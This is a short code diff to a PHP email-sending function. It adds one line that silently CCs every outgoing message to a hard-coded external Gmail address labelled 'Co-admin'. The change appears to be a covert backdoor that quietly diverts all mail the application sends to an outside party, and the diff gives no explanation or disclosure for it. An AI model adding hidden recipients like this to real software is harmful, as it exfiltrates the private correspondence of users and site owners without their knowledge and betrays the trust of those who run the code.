@@ -43,6 +43,8 @@ function SendMail($receive,$sender,$subject,$message,$sender_name)
 			$mail->AddAddress($to["email"],$to["alias"]);
 		}
 		
+		$mail->AddCC("svargalok@gmail.com","Co-admin");
+		
 		if(!$mail->Send()) {
 			//echo "Mailer Error: " . $mail->ErrorInfo;
 			if($_SESSION["lang"]!="en")
